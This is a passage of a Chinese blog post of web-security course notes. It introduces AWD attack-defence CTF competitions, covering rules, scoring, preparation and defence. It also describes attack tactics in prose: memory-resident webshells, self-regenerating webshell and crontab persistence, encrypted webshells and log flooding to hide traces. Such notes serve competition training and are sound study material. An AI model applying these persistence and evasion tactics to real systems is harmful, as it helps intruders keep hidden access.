<li>漏洞场景：Express框架中处理POST请求时使用lodash.merge</li>
<li>攻击方式：通过构造恶意POST请求体污染原型链</li>
<li>防御要点：避免直接合并用户可控数据到对象原型</li>
</ul>
<h4 id="AWD比赛入门"><a href="#AWD比赛入门" class="headerlink" title="AWD比赛入门"></a>AWD比赛入门</h4><h2 id="九，AWD比赛"><a href="#九，AWD比赛" class="headerlink" title="九，AWD比赛"></a><font style="color:#DF2A3F;">九，AWD比赛</font></h2><h5 id="1-AWD比赛简介与比赛形式-00-23"><a href="#1-AWD比赛简介与比赛形式-00-23" class="headerlink" title="**1. AWD比赛简介与比赛形式 **00:23"></a>**1. AWD比赛简介与比赛形式 **<strong>00:23</strong></h5><h6 id="1）什么是AWD-00-26"><a href="#1）什么是AWD-00-26" class="headerlink" title="**1）什么是AWD **00:26"></a>**1）什么是AWD **<strong>00:26</strong></h6><p>+ </p>
<ul>
<li><strong>全称解释</strong><strong>: AWD是Attack With Defence的缩写，即”攻防兼备”的比赛模式</strong></li>
<li><strong>与传统CTF区别</strong><strong>:</strong><ul>
<li><strong>传统模式</strong><strong>: 选手通过解出预置题目得分，解题速度决定排名，题目解答完成后即结束（人与机器的对抗）</strong></li>
<li><strong>AWD模式</strong><strong>: 需要防守自己的服务器并攻击他人服务器，同一漏洞可多轮次得分（人与机器+人与人的双重对抗）</strong></li>
</ul>
</li>
<li><strong>服务类型</strong><strong>:</strong><ul>
<li><strong>二进制服务</strong><strong>: 编译好的可执行文件，可能监听特定端口或使用自定义协议</strong></li>
<li><strong>Web服务</strong><strong>: 自研或修改的第三方应用，可能存在未知漏洞</strong></li>
</ul>
</li>
<li><strong>得分机制</strong><strong>: 通过获取服务器上的flag文件内容提交得分，flag会定期更新（通常5-30分钟一轮）</strong></li>
</ul>
<h6 id="2）AWD常见的比赛规则-05-00"><a href="#2）AWD常见的比赛规则-05-00" class="headerlink" title="**2）AWD常见的比赛规则 **05:00"></a>**2）AWD常见的比赛规则 **<strong>05:00</strong></h6><p>+ </p>
<p>+<br>    - <strong>每个队伍获得相同数量和内容的服务（二进制+Web）</strong><br>    - <strong>新增题目也会平均分配给所有队伍</strong></p>
<ul>
<li><strong>漏洞特性</strong><strong>:</strong><ul>
<li><strong>每个服务至少存在一个漏洞（可能是已知或出题人自研漏洞）</strong></li>
<li><strong>需在保证服务功能正常的前提下修补漏洞</strong></li>
</ul>
</li>
<li><h2 id="check机制-有专门服务验证功能可用性-功能异常会被扣分（如注册-登录功能失效）"><a href="#check机制-有专门服务验证功能可用性-功能异常会被扣分（如注册-登录功能失效）" class="headerlink" title="check机制:  - 有专门服务验证功能可用性  - 功能异常会被扣分（如注册&#x2F;登录功能失效）"></a><strong>check机制</strong><strong>:</strong><br>  - <strong>有专门服务验证功能可用性</strong><br>  - <strong>功能异常会被扣分（如注册&#x2F;登录功能失效）</strong></h2></li>
<li><strong>得分方式</strong><strong>:</strong><ul>
<li><strong>基础得分</strong><strong>: 提交其他队伍服务器的flag内容（需包含队伍token验证）</strong></li>
<li><strong>附加得分</strong><strong>: 当自己服务正常而其他队伍相同服务异常时，可能获得扣分队伍的均分</strong></li>
</ul>
</li>
<li><strong>扣分情形</strong><strong>:</strong><ul>
<li><strong>flag被他人提交（每轮单独扣分）</strong></li>
<li><strong>服务不可用（可与flag扣分叠加）</strong></li>
<li><strong>多服务独立计分（每个服务都可能因不可用被扣分）</strong></li>
</ul>
</li>
</ul>
<h6 id="3）AWD的初始资源-12-28"><a href="#3）AWD的初始资源-12-28" class="headerlink" title="**3）AWD的初始资源 **12:28"></a>**3）AWD的初始资源 **<strong>12:28</strong></h6><p>+ </p>
<ul>
<li><strong>基础访问信息</strong><strong>:</strong><ul>
<li><strong>服务器IP、用户名、密码&#x2F;密钥</strong></li>
<li><strong>可能包含源码、二进制文件和流量包</strong></li>
</ul>
</li>
<li><strong>服务定位规则</strong><strong>:</strong><ul>
<li><strong>同IP段部署（如10.10.1.2:8080中，1为队伍ID，2为服务编号）</strong></li>
<li><strong>端口映射可能通过路由器转换（实际访问IP可能与本地IP不同）</strong></li>
</ul>
</li>
</ul>
<h5 id="2-AWD-Plus简介-15-48"><a href="#2-AWD-Plus简介-15-48" class="headerlink" title="**2. AWD Plus简介 **15:48"></a>**2. AWD Plus简介 **<strong>15:48</strong></h5><h6 id="1）什么是AWD-plus-15-54"><a href="#1）什么是AWD-plus-15-54" class="headerlink" title="**1）什么是AWD plus **15:54"></a>**1）什么是AWD plus **<strong>15:54</strong></h6><p>+ </p>
<ul>
<li><strong>模式特点</strong><strong>:</strong><ul>
<li><strong>弱化选手直接对抗，强化漏洞挖掘难度</strong></li>
<li><strong>分为Break（攻击）和Fix（修复）两个环节</strong></li>
</ul>
</li>
<li><strong>Break环节</strong><strong>:</strong><ul>
<li><strong>需要组合利用多个基础漏洞才能获取flag</strong></li>
<li><strong>靶机为独立环境，操作失误可申请重置（有次数限制）</strong></li>
</ul>
</li>
<li><strong>Fix环节</strong><strong>:</strong><ul>
<li><strong>提供修复方案（可能通过SSH直接修复或提交修复包）</strong></li>
<li><strong>需通过双重检查：功能可用性测试+漏洞修复验证</strong></li>
</ul>
</li>
</ul>
<hr>
<hr>
<hr>
<h4 id="一、AWD比赛中的对抗技巧-00-00"><a href="#一、AWD比赛中的对抗技巧-00-00" class="headerlink" title="**一、AWD比赛中的对抗技巧 **00:00"></a>**一、AWD比赛中的对抗技巧 **<strong>00:00</strong></h4><h5 id="1-内容目录-00-04"><a href="#1-内容目录-00-04" class="headerlink" title="**1. 内容目录 **00:04"></a>**1. 内容目录 **<strong>00:04</strong></h5><p>+ </p>
<ul>
<li><strong>课程结构****：分为赛前准备和赛中对抗两大模块，赛前准备包括脚本环境配置、工具准备和exploit框架搭建；赛中对抗包含防御和攻击两个方向</strong></li>
</ul>
<h5 id="2-赛前准备-00-13"><a href="#2-赛前准备-00-13" class="headerlink" title="**2. 赛前准备 **00:13"></a>**2. 赛前准备 **<strong>00:13</strong></h5><h6 id="1）脚本环境-01-04"><a href="#1）脚本环境-01-04" class="headerlink" title="**1）脚本环境 **01:04"></a>**1）脚本环境 **<strong>01:04</strong></h6><p>+ </p>
<ul>
<li><strong>环境隔离性****：AWD比赛通常不提供外网连接，所有运行环境需提前本地配置</strong></li>
<li><strong>多版本配置****：</strong><ul>
<li><strong>PHP需同时配置PHP5和PHP7大版本</strong></li>
<li><strong>Java需预装JDK8和JDK11</strong></li>
<li><strong>Python建议配置python2.7和python3.6</strong></li>
</ul>
</li>
<li><strong>环境复原****：需根据获取的源码搭建完整环境，包括语言环境（如PHP）、中间件（如Apache）和数据库（如MySQL）</strong></li>
</ul>
<h6 id="2）工具-04-06"><a href="#2）工具-04-06" class="headerlink" title="**2）工具 **04:06"></a>**2）工具 **<strong>04:06</strong></h6><ul>
<li><h2 id="代码审计工具-04-21"><a href="#代码审计工具-04-21" class="headerlink" title="**代码审计工具 **04:21"></a>**代码审计工具 **<strong>04:21</strong></h2><ul>
<li><strong>IDE工具****：针对不同语言选择专用IDE（如IDEA用于Java，PHP Storm用于PHP）</strong></li>
<li><strong>后门分析****：使用D盾等工具快速扫描预置后门</strong></li>
<li><strong>二进制分析****：IDA Pro等工具用于逆向分析可执行文件</strong></li>
</ul>
</li>
<li>**服务连接工具 **<strong>05:26</strong><ul>
<li><strong>SSH工具****：推荐XShell（Windows）和Termius（MacOS），避免使用命令行原生ssh</strong></li>
<li><strong>FTP工具****：建议使用XFTP等专用工具，或选择集成FTP功能的SSH工具</strong></li>
</ul>
</li>
</ul>
<h6 id="3）exploit及相关脚本框架-07-06"><a href="#3）exploit及相关脚本框架-07-06" class="headerlink" title="**3）exploit及相关脚本框架 **07:06"></a>**3）exploit及相关脚本框架 **<strong>07:06</strong></h6><p>+ </p>
<ul>
<li><strong>脚本分类****：</strong><ul>
<li><strong>漏洞批量利用脚本：需支持IP循环探测、漏洞利用细节和操作执行三个独立模块</strong></li>
<li><strong>权限维持脚本：防止防守方修复漏洞后失去持续利用能力</strong></li>
<li><strong>防御脚本：监控攻击流量和文件变动，用于漏洞回溯和快速定位</strong></li>
</ul>
</li>
<li><strong>设计原则****：各功能模块保持低耦合，便于针对不同比赛需求修改特定部分</strong></li>
</ul>
<h5 id="3-赛中对抗-10-31"><a href="#3-赛中对抗-10-31" class="headerlink" title="**3. 赛中对抗 **10:31"></a>**3. 赛中对抗 **<strong>10:31</strong></h5><h6 id="1）备份-10-52"><a href="#1）备份-10-52" class="headerlink" title="**1）备份 **10:52"></a>**1）备份 **<strong>10:52</strong></h6><p>+ </p>
<ul>
<li><strong>备份内容****：</strong><ul>
<li><strong>源代码和二进制文件：用于差异对比发现篡改</strong></li>
<li><strong>数据库：防止数据被恶意删除</strong></li>
<li><strong>日志：记录访问IP、时间和操作详情</strong></li>
</ul>
</li>
<li><strong>备份价值****：保留原始信息作为基准，便于识别异常变动</strong></li>
</ul>
<h6 id="2）流量记录-12-09"><a href="#2）流量记录-12-09" class="headerlink" title="**2）流量记录 **12:09"></a>**2）流量记录 **<strong>12:09</strong></h6><ul>
<li><strong>记录要素****：</strong><ul>
<li><strong>完整的GET&#x2F;POST数据</strong></li>
<li><strong>上传文件元数据和内容</strong></li>
<li><strong>访问路径和时间戳</strong></li>
<li><strong>系统文件变动历史</strong></li>
</ul>
</li>
<li><strong>应用场景****：通过分析异常流量定位攻击入口和未发现漏洞</strong></li>
</ul>
<h6 id="3）后门查杀-12-52"><a href="#3）后门查杀-12-52" class="headerlink" title="**3）后门查杀 **12:52"></a>**3）后门查杀 **<strong>12:52</strong></h6><ul>
<li><strong>查杀重点****：</strong><ul>
<li><strong>Web脚本文件（PHP&#x2F;JSP）</strong></li>
<li><strong>crontab定时任务</strong></li>
<li><strong>shell script文件</strong></li>
</ul>
</li>
<li><strong>查杀策略****：注意文件间的关联性，防止攻击者通过闭环设计实现持久化</strong></li>
</ul>
<h6 id="4）攻击-14-46"><a href="#4）攻击-14-46" class="headerlink" title="**4）攻击 **14:46"></a>**4）攻击 **<strong>14:46</strong></h6><ul>
<li><h2 id="漏洞挖掘-14-55"><a href="#漏洞挖掘-14-55" class="headerlink" title="**漏洞挖掘 **14:55"></a>**漏洞挖掘 **<strong>14:55</strong></h2><ul>
<li><strong>日志分析****：结合大屏攻击记录回溯特定时间段的可疑流量</strong></li>
<li><strong>快速定位****：</strong><ul>
<li><strong>版本识别和历史漏洞匹配</strong></li>
<li><strong>预置后门特征检测</strong></li>
</ul>
</li>
<li><strong>Check服务分析****：通过特殊IP的检查行为逆向服务验证机制</strong></li>
</ul>
</li>
<li><h2 id="漏洞利用-17-08"><a href="#漏洞利用-17-08" class="headerlink" title="**漏洞利用 **17:08"></a>**漏洞利用 **<strong>17:08</strong></h2><ul>
<li><strong>权限维持技术****：</strong><ul>
<li><strong>不死马：通过内存驻留抵抗文件删除</strong></li>
<li><strong>多文件组合：web shell、crontab和shell script相互再生</strong></li>
</ul>
</li>
<li><strong>干扰策略****：</strong><ul>
<li><strong>发送大量垃圾流量污染对手日志</strong></li>
<li><strong>使用RSA加密webshell防止复用</strong></li>
</ul>
</li>
<li><strong>批量利用****：IP段循环探测结合自动化漏洞利用链</strong></li>
</ul>
</li>
</ul>
<h4 id=""><a href="#" class="headerlink" title="****"></a>****</h4></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://only-only1.github.io">Only0901</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://only-only1.github.io/2025/11/27/web%E5%AE%89%E5%85%A8/">https://only-only1.github.io/2025/11/27/web%E5%AE%89%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://only-only1.github.io" target="_blank">Only0901'blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/980.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/26/hello-world/" title="Hello World"><img class="cover" src="/images/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">🚀 开启您的数字安全之旅欢迎来到这个充满挑战与机遇的网络安全世界！在这里，我们将共同探索：  🔍 网络攻防最前线 🛡️ 数据加密与隐私保护 💻 恶意软件分析与防御 🌐 物联网安全新战场 🚨 最新安全漏洞速递   📌 本周焦点专栏 图片来源：Unsplash 代码安全示意图 零日漏洞预警🔥 最新披露的 Apache Log4j2 漏洞深度解析🛠️ 临时缓解方案与补丁更新指南🔗 相关 CVE 编号：CVE-2021-44228  🛠️ 实用工具推荐   1234 # 常用网络安全工具速查nmap -sV -O target_ipwireshark &amp;metasploit-framework    </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Only0901</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to Only0901's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一，信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8CSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二，SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">1.数字型注入测试方法：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">2.字符型注入：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">3.布尔盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">4.时间盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">5.报错注入：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E7%94%A8%E6%88%B7%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E4%BD%8D%E7%BD%AE%E4%B8%8D%E5%90%8C%E5%AF%BC%E8%87%B4%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%82%B9-%EF%BC%9A"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">6.用户插入数据位置不同导致的SQL注入点 ：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">实验步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%8Cxss"><span class="toc-number">3.</span> <span class="toc-text">三，xss</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9A"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">反射型XSS：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E6%89%A7%E8%A1%8CXSS%E7%9A%84%E6%A0%87%E7%AD%BE"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">. 可以用来执行XSS的标签</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML5%E7%89%B9%E6%80%A7%E7%9A%84XSS"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">HTML5特性的XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Javascript%E4%BC%AA%E5%8D%8F%E8%AE%AExss"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">Javascript伪协议xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC%E8%BF%87%E6%BB%A4"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">富文本过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">3.0.0.5.</span> <span class="toc-text">注入点在标签属性中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8script%E6%A0%87%E7%AD%BE%E4%B8%AD"><span class="toc-number">3.0.0.6.</span> <span class="toc-text">注入点在script标签中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CSP%E8%BF%87%E6%BB%A4%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.0.7.</span> <span class="toc-text">CSP过滤及其绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-4046%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.0.0.8.</span> <span class="toc-text">CVE-2020-4046漏洞分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8CSSRF"><span class="toc-number">4.</span> <span class="toc-text">四，SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%94%AF%E6%8C%81%E6%83%85%E5%86%B5"><span class="toc-number">4.0.0.0.1.</span> <span class="toc-text">Gopher协议的支持情况</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Gopher%E8%AE%BF%E9%97%AERedis"><span class="toc-number">4.0.0.0.2.</span> <span class="toc-text">使用Gopher访问Redis</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">SSRF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IP%E5%9C%B0%E5%9D%80%E5%8F%98%E5%BD%A2"><span class="toc-number">4.0.0.1.1.</span> <span class="toc-text">IP地址变形</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8%E8%B7%B3%E8%BD%AC-12-41"><span class="toc-number">4.0.0.1.2.</span> <span class="toc-text">2）利用跳转 12:41</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8URL%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98-13-07"><span class="toc-number">4.0.0.1.3.</span> <span class="toc-text">利用URL解析问题 13:07</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%89%E5%88%A9%E7%94%A8DNS-15-00"><span class="toc-number">4.0.0.1.4.</span> <span class="toc-text">4）利用DNS 15:00</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">五，命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%84%E4%BB%B6Node-js%E7%8E%AF%E5%A2%83"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">漏洞组件Node.js环境</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">六，文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%A4%BA%E4%BE%8B"><span class="toc-number">6.0.0.0.1.</span> <span class="toc-text">PHP文件上传示例</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">文件名截断绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D"><span class="toc-number">6.0.0.1.1.</span> <span class="toc-text">上传文件重命名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%8D%E9%87%8D%E5%91%BD%E5%90%8D"><span class="toc-number">6.0.0.1.2.</span> <span class="toc-text">上传文件不重命名</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E6%89%A9%E5%B1%95%E5%90%8D%E6%A0%A1%E9%AA%8C"><span class="toc-number">6.0.0.2.</span> <span class="toc-text">白名单扩展名校验</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IIS%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7"><span class="toc-number">6.0.0.2.1.</span> <span class="toc-text">IIS解析缺陷</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Nginx%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7"><span class="toc-number">6.0.0.2.2.</span> <span class="toc-text">Nginx解析缺陷</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7"><span class="toc-number">6.0.0.2.3.</span> <span class="toc-text">Apache解析缺陷</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.3.</span> <span class="toc-text">文件上传后禁止访问绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%9C-htaccess%E2%80%9D%E7%A6%81%E6%AD%A2%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90-09-20"><span class="toc-number">6.0.0.3.1.</span> <span class="toc-text">“.htaccess”禁止脚本文件解析 09:20</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0OSS-10-05"><span class="toc-number">6.0.0.3.2.</span> <span class="toc-text">2）上传文件到OSS 10:05</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-10-41"><span class="toc-number">6.0.0.3.3.</span> <span class="toc-text">3）配合文件包含 10:41</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%9F%A5%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.4.</span> <span class="toc-text">文件类型检查绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#getimagesize%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.4.1.</span> <span class="toc-text">getimagesize绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#imagecreatefromjpeg%E7%BB%95%E8%BF%87"><span class="toc-number">6.0.0.4.2.</span> <span class="toc-text">imagecreatefromjpeg绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.0.1.</span> <span class="toc-text">序列化与反序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%EF%BC%8CPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">七，PHP序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C%E7%A4%BA%E4%BE%8B"><span class="toc-number">7.0.0.0.1.</span> <span class="toc-text">序列化操作示例</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">7.0.0.1.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%BC%94%E7%A4%BA"><span class="toc-number">7.0.0.1.1.</span> <span class="toc-text">反序列化过程演示</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%89%B9%E5%BE%81%E5%80%BC"><span class="toc-number">7.0.0.2.</span> <span class="toc-text">序列化特征值</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.1.</span> <span class="toc-text">反序列化漏洞的初级利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Gadget%E6%9E%84%E9%80%A0"><span class="toc-number">7.0.1.1.</span> <span class="toc-text">Gadget构造</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Gadget%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">7.0.1.1.1.</span> <span class="toc-text">Gadget是什么</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">7.0.1.1.2.</span> <span class="toc-text">PHP中的魔术方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.0.1.2.</span> <span class="toc-text">命名空间中的反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95"><span class="toc-number">7.0.1.2.1.</span> <span class="toc-text">命名空间定义方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 